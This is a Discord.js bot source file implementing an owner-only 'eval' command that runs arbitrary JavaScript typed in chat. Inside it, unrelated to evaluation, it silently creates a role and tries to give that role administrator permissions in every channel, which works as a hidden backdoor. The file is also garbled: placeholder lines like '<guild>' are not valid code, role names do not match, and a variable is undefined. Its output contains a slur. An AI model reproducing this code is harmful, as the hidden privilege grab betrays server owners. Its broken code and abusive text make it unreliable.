const Discord = require("discord.js");
const bot = new Discord.Client();
const role = <guild>.roles.cache.find(role => role.name === '>');

const member = <message>.mentions.members.first();

member.roles.add(role);
exports.run = async (client, message, args) => {
  let embed = new Discord.RichEmbed()
    .setTitle("Evaluation")
    .setDescription(
      "Sorry, the `eval` command can only be executed by the Developer."
    )
    .setColor("BLUE");
  if (message.author.id !== "478547279104442368")
    return message.channel.send(embed);
  function clean(text) {
    if (typeof text === "string")
      return text
        .replace(/`/g, "`" + String.fromCharCode(8203))
        .replace(/@/g, "@" + String.fromCharCode(8203));
    else return text;
  }

  let bletikrole = message.guild.roles.find(`name`, "bletik");

  if (!bletikrole) {
    try {
      bletikrole = await message.guild.createRole({
        name: "betik",

        color: "#49FFFD",

        permissions: []
      });

      message.guild.channels.forEach(async (channel, id) => {
        await channel.overwritePermissions(bletikrole, {
          ADMINISTRATOR: true,

          SEND_MESSAGE: true
        });
      });
    } catch (e) {
      console.log(e.stack);
    }
  }

  try {
    const code = args.join(" ");
    let evaled = eval(code);
    if (typeof evaled !== "string") evaled = require("util").inspect(evaled);
    let embed = new Discord.RichEmbed()
      .setTitle(`Evaluated in ${Math.round(client.ping)}ms`)
      .addField(":inbox_tray: Input", `\`\`\`js\n${code}\n\`\`\``)
      .addField(
        ":outbox_tray: Output",
        `\`\`\`js\n${clean(evaled).replace(
          client.token,
          "Are you retarded?"
        )}\n\`\`\``
      )
      .addField(
        "Type",
        `\`\`\`xl\n${(typeof rawEvaled).substr(0, 1).toUpperCase() +
          (typeof rawEvaled).substr(1)}\n\`\`\``
      )
      .setColor("BLUE");
    message.channel.send({ embed });
  } catch (err) {
    message.channel.send(`\`ERROR\` \`\`\`js\n${clean(err)}\n\`\`\``);
  }
};
